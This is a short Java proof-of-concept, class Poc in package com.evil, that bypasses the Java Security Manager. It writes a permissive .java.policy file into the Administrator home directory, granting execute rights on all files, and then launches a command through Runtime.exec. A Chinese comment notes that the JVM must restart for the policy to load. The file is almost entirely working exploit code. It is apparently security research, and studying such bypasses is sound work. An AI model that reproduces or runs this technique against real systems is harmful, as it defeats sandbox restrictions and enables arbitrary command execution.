package com.evil;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.net.Socket;

public class Poc {
    public static void main(String[] args) throws IOException {
        //Run with: -Djava.security.manager -Djava.security.policy==rewrite-home-policy.policy
        //通过这种方法绕过时，需要先写入.java.policy文件，然后重启jvm，.java.policy才能加载进来。
        exec("calc");
        bypass();
    }

    public static void bypass() {
        final String homePolicyFile = "grant {\n" +
                "    permission java.io.FilePermission \"<<ALL FILES>>\", \"execute\";\n" +
                "};";
        try {
            FileWriter writer = new FileWriter("C:\\Users\\Administrator\\.java.policy");
            writer.write(homePolicyFile);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        exec("calc");
    }

    public static void exec(String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
